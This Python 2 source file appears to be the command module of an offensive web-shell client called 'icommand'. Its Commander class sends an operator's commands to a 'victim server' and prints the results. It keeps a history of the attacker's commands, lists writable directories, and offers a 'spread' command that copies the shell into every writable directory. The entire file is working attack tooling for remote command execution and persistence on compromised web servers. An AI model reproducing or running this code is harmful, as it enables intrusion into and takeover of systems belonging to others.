# importing modules
from request_info import request_type
from server_info import serverinfo
from menu import Colors, get_banner
from urllib import unquote
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to provide elaborate line editing and history features.'
else:
    pass


class Commander(object):
    '''
    Class to execute commands on the victim server
    '''
    def BackConnect(self):
        i = 1
        # empty list to save attacker's pushed commands
        history = []
        while True:
            try:
                try:
                    # getting command to be executed from the user
                    command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=serverinfo.source[0],
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=serverinfo.source[4],
                        cwd=serverinfo.source[3]))
                # if something went wrong screw the list
                except IndexError:
                    command = raw_input('icommand@server:$ ')
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()

                    # getting all commands attackr's did on the server
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1

                    # execute the command on the attacker's box if ! provided
                    # at the first of the command
                    elif command.startswith('!'):
                        Popen(command[1:], shell=True).wait()

                    # get stored info from
                    elif command == 'info':
                        print serverinfo.info

                    # get icommand banner
                    elif command == 'banner':
                        print get_banner

                    # get all writable directories
                    elif command == 'writable':
                        serverinfo.get_writable()

                    # spreat the shell to all writable directories
                    elif command == 'spread':
                        serverinfo.spread_shell()

                    else:
                        # setting aliases for some commands to avoid
                        # issues realted to empty directories
                        if 'ls' in command:
                            command = command.replace('ls', 'ls -lha')
                        if 'rm' in command:
                            command = command.replace('rm', 'rm -v')
                        request_type.cmd = command

                        # get the source code cotenets
                        source = request_type.get_page_source().read()
                        if source:
                            print source.rstrip()

                        # if the executed command doesn't exist
                        else:
                            print '{}: command not found'.format(unquote(command))

                # exist icommand if user provides exit as a command
                else:
                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                    exit(1)

            # exit icommand if it recieved a ^c
            except KeyboardInterrupt:
                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                exit(1)
            i += 1

# taking an instance from the main class
commander = Commander()
